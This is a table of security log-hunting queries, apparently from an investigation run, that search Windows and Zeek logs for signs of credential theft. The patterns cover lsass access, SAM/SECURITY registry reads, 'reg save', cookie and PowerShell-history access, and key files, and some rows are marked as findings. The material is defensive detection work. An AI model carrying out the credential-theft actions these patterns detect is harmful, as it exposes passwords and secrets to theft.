| q-9b4d9485e1 | check C080 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Credential* OR process.command_line:*prompt*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user… | 0 |  |
| q-a12798a611 | check C081 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-8f2b5dd439 | check C082 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-48baedc93f | check C083 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-97b46c3a4b | check C084 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*login* OR file.path:*portal* OR file.path:*wwwroot* OR file.path:*inetpub*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "eve… | 0 |  |
| q-d36d56ff66 | check C085 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1649 |  |
| q-93f2f9ac73 | check C086 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*iis* OR process.command_line:*w3wp* OR process.command_line:*wwwroot*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset",… | 0 |  |
| q-2be8a4923c | check C087 | search | {"dataset": "windows.security", "query": "event.code:4663 AND (win.ObjectName:*wwwroot* OR win.ObjectName:*inetpub* OR win.ObjectName:*login*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.… | 0 |  |
| q-03d9753253 | check C088 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 5337 |  |
| q-6db9dca695 | check C089 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*wwwroot* OR powershell.script_block_text:*login* OR powershell.script_block_text:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.n… | 0 |  |
| q-0a0a07f893 | check C090 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-602d8474ce | check C091 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*login* OR url.original:*portal*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "… | 0 |  |
| q-2a6eb5ea7d | check C092 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-8aa524f840 | check C093 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-18a022ba25 | check C094 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20259 |  |
| q-fb3f764c53 | check C095 | search | {"dataset": "windows.sysmon", "query": "event.code:8", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 95 |  |
| q-40e27c116a | check C096 | aggregate | {"dataset": "windows.security", "field": "win.CallerProcessName", "query": "event.code:4656 AND win.ObjectType:*Process*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 13 |  |
| q-a569bd622f | check C097 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*hook* OR powershell.script_block_text:*SetWindowsHookEx* OR powershell.script_block_text:*MiniDump*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.… | 0 |  |
| q-1cb315384d | check C098 | search | {"dataset": "windows.other", "query": "message:*hook* OR message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 0 |  |
| q-565e72647e | check C099 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-147dae634d | check C100 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-bfdabdf14c | check C101 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-f11fedb4ad | check C102 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 2 |  |
| q-efe315d0c9 | check C103 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Credential* OR powershell.script_block_text:*Password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-0753d722d7 | check C104 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*net* OR process.command_line:*login*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 30 |  |
| q-2255ed6b91 | check C105 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-df1d3dd803 | check C106 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 0 |  |
| q-5fe2326d08 | check C107 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-ec17e5c216 | check C108 | search | {"dataset": "windows.other", "query": "message:*4625* OR message:*failed*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 2 |  |
| q-efe89253e5 | check C109 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Password* OR powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-8349cbf4b2 | check C110 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*password*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-4c39e3f6cc | check C111 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-dbdcd2d97b | check C112 | aggregate | {"dataset": "windows.security", "field": "win.ProcessName", "query": "event.code:4663 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-2271c4f103 | check C113 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*hash* OR process.command_line:*crack*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-b8339f6f1c | check C114 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*.txt OR win.TargetFilename:*.pot)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20 |  |
| q-51b666de31 | check C115 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*SAM*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-c2bbefe5f1 | check C116 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*hash* OR powershell.script_block_text:*ConvertTo-SecureString*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code",… | 0 |  |
| q-92a2f06bb6 | check C117 | search | {"dataset": "windows.other", "query": "message:*SAM* OR message:*hash*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sourc… | 1 |  |
| q-788d949afb | check C118 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-0bfcf3da33 | check C119 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-5f734c0f39 | check C120 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-7e4c91dffb | check C121 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-0daae6bc5d | check C122 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*account*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 7 |  |
| q-5a27bd5870 | check C123 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Password* OR powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-0405f6396e | check C124 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*user*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-518b646389 | check C125 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-5fe612913b | check C126 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-5d0ca95b08 | check C127 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-65f71e9509 | check C128 | search | {"dataset": "windows.other", "query": "message:*logon* OR message:*credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line"… | 4 |  |
| q-a55c2499cd | check C129 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:*Credential* OR powershell.script_block_text:*Password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.n… | 0 |  |
| q-b10b021129 | check C130 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND process.command_line:*password*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-9ffb84e02a | check C131 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-5570c56bf4 | check C132 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-a69a421c0d | check C133 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-9bf730aa8d | check C134 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND registry.path:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 11 |  |
| q-1578e073a0 | check C135 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND powershell.script_block_text:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executab… | 0 |  |
| q-4a9b6af715 | check C136 | search | {"dataset": "windows.other", "query": "message:*Credential*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "des… | 2 |  |
| q-2d31df364d | check C137 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-788e33edc1 | check C138 | search | {"dataset": "windows.security", "query": "event.code:5140 OR event.code:5145", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 163 |  |
| q-bba7057ba0 | check C139 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-50fa5fbef0 | check C140 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable… | 66 |  |
| q-f382dee3a0 | check C141 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*445* OR powershell.script_block_text:*WebDAV* OR powershell.script_block_text:*NTLM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "ob… | 0 |  |
| q-67ec45eb88 | check C142 | search | {"dataset": "windows.other", "query": "message:*445* OR message:*WebDAV*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 0 |  |
| q-4f4b6aceb5 | check C143 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 50 |  |
| q-f60917454b | check C144 | search | {"dataset": "zeek", "query": "event.action:http AND (http.request.method:PROPFIND OR http.request.method:MOVE OR http.request.method:OPTIONS)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.c… | 36 |  |
| q-5e2e687fe1 | check C145 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4768 OR event.code:4769 OR event.code:4770", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 42 |  |
| q-6ddf9d0c3f | check C146 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 | F22 |
| q-03cec2583f | check C147 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-08a420d9db | check C148 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.GrantedAccess:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line",… | 39283 |  |
| q-8498b55125 | check C149 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Invoke-* OR powershell.script_block_text:*Exploit*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "ev… | 0 |  |
| q-a1bef249a3 | check C150 | search | {"dataset": "windows.other", "query": "message:*exploit*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destin… | 0 |  |
| q-0fc6a83d8d | check C151 | search | {"dataset": "zeek", "query": "event.action:notice OR event.action:weird", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sour… | 14 | F23 |
| q-dd4523f62b | check C152 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-f9987ab248 | check C153 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*cookie* OR process.command_line:*Cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 5 |  |
| q-5c725789d3 | check C154 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-3ee7820e0e | check C155 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 1 |  |
| q-91f30b06a9 | check C156 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-50a6649f7f | check C157 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND (win.TargetFilename:*Cookies* OR win.TargetFilename:*cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pro… | 0 |  |
| q-6da3502827 | check C158 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*Cookie*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "even… | 0 |  |
| q-2255710e22 | check C159 | search | {"dataset": "windows.other", "query": "message:*cookie*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destina… | 0 |  |
| q-6d9edc4b8d | check C160 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:GET", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 2 |  |
| q-fcddfdd087 | check C161 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-e3d18e480f | check C162 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*password* OR process.command_line:*credential* OR process.command_line:*unattend*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name",… | 0 |  |
| q-8b763c375f | check C163 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-1ef32ac9a5 | check C164 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*unattend* OR win.TargetFilename:*password* OR win.TargetFilename:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 1 | F29 |
| q-8ef3504e44 | check C165 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-c0443d809a | check C166 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Password* OR registry.path:*Credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process… | 17 | F31 |
| q-9503e86170 | check C167 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*password* OR powershell.script_block_text:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset",… | 0 |  |
| q-2443576029 | check C168 | search | {"dataset": "windows.other", "query": "message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-fafaa1a0ad | check C169 | search | {"dataset": "zeek", "query": "event.action:smb_files", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 12 | F30 |
| q-0e92dd240f | check C170 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-e42adce479 | check C171 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-7b9ad8ea0a | check C172 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-13ecd6e299 | check C173 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*password* OR process.command_line:*credential* OR process.command_line:*config*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event… | 8 |  |
| q-5122af42f0 | check C174 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-8256903a40 | check C175 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*.config OR win.TargetFilename:*.xml OR win.TargetFilename:*.txt)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 44 |  |
| q-3d545ac5cd | check C176 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Get-Content* OR powershell.script_block_text:*Select-String*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-ec065b2246 | check C177 | search | {"dataset": "windows.other", "query": "message:*password*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-1c76c14001 | check C178 | search | {"dataset": "zeek", "query": "event.action:smb_files", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinatio… | 12 |  |
| q-337ae8f131 | check C179 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*\\\\sam\\\\*\" OR TO_LOWER(registry.path) LIKE \"*\\\\security\\\\*\" OR TO_LOWER(registry.path) LIKE \"*password*\" OR TO_LOWER… | ERROR |  |
| q-52cc6a80d5 | check C179 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"13\" AND (TO_LOWER(registry.path) LIKE \"*\\\\\\\\sam\\\\\\\\*\" OR TO_LOWER(registry.path) LIKE \"*\\\\\\\\security\\\\\\\\*\" OR TO_LOWER(registry.path) LIKE \"*passwor… | 60 |  |
| q-9ef2830fb1 | check C180 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-566c77c0ec | check C181 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*reg query*\" OR TO_LOWER(process.command_line) LIKE \"*reg save*\" OR TO_LOWER(process.command_line) LIKE \"*\\\\sam*\" OR… | ERROR |  |
| q-5b319e9d33 | check C181 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*reg query*\" OR TO_LOWER(process.command_line) LIKE \"*reg save*\" OR TO_LOWER(process.command_line) LIKE \"*sam*\" OR TO_… | 5 |  |
| q-b067fdd550 | check C182 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\sam*\" OR TO_LOWER(win.ObjectName) LIKE \"*\\\\security*\" OR TO_LOWER(win.ObjectName) LIK… | ERROR |  |
| q-5626e744ed | check C182 (repaired) | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4670\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*\\\\\\\\sam*\" OR TO_LOWER(win.ObjectName) LIKE \"*\\\\\\\\security*\" OR TO_LOWER(win.ObjectN… | 500 |  |
| q-1868f9ad26 | check C183 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*reg query*\" OR TO_LOWER(COALESCE(powershell.script_block_t… | ERROR |  |
| q-67a34784d8 | check C183 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*reg query*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*reg save*\" OR TO_L… | 1 |  |
| q-c428641f3f | check C184 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\sam*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\security*\" OR TO_LOWER(COALESCE(message, win.Message, \"\"… | ERROR |  |
| q-4e621f11f2 | check C184 (repaired) | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\\\\\sam*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*\\\\\\\\security*\" OR TO_LOWER(COALESCE(message, win.Messa… | 3 |  |
| q-26a8031e05 | check C185 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(powershell.script_block_text, win.ScriptBlockText, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(powershell.script_block_tex… | ERROR |  |
| q-0980e6f236 | check C185 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code IN (\"4103\",\"4104\") AND (TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(win.ScriptBlockText, \"\")) LIKE \"*consolehost_history*\… | 1 |  |
| q-d49e2558d8 | check C186 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*consolehost_history*\" OR TO_LOWER(process.command_line) LIKE \"*psreadline*\" OR TO_LOWER(process.command_line) LIKE \"*h… | 0 |  |
| q-4ca2b91a5b | check C187 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*consolehost_history*\" OR TO_LOWER(file.path) LIKE \"*psreadline*\" OR TO_LOWER(file.path) LIKE \"*\\\\history*\" OR TO_LOWER(file.p… | ERROR |  |
| q-bbd98ca151 | check C187 (repaired) | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*consolehost_history*\" OR TO_LOWER(file.path) LIKE \"*psreadline*\" OR TO_LOWER(file.path) LIKE \"*history*\" OR TO_LOWER(file.path)… | 15 |  |
| q-0265febb6a | check C188 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code IN (\"4663\",\"4656\",\"4658\") AND (TO_LOWER(win.ObjectName) LIKE \"*consolehost_history*\" OR TO_LOWER(win.ObjectName) LIKE \"*psreadline*\" OR TO_LOWER(win.ObjectName) LI… | 0 |  |
| q-7cfef0470b | check C189 | esql | {"query": "FROM logs-windows.other-default METADATA _id, _index \| WHERE TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*history*\" OR TO_LOWER(COALESCE(message, win.Message, \"\")) LIKE \"*psreadline*\" \| KEEP @timestamp, host.name, event.code, messag… | 5 |  |
| q-ffb5ceeca7 | check C190 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"11\" AND (TO_LOWER(file.path) LIKE \"*.key\" OR TO_LOWER(file.path) LIKE \"*.pgp\" OR TO_LOWER(file.path) LIKE \"*.gpg\" OR TO_LOWER(file.path) LIKE \"*.ppk\" OR TO_LOWER… | 1 |  |
| q-c49d0eb687 | check C191 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*.pem*\" OR TO_LOWER(process.command_line) LIKE \"*.pfx*\" OR TO_LOWER(process.command_line) LIKE \"*.p12*\" OR TO_LOWER(pr… | 0 |  |
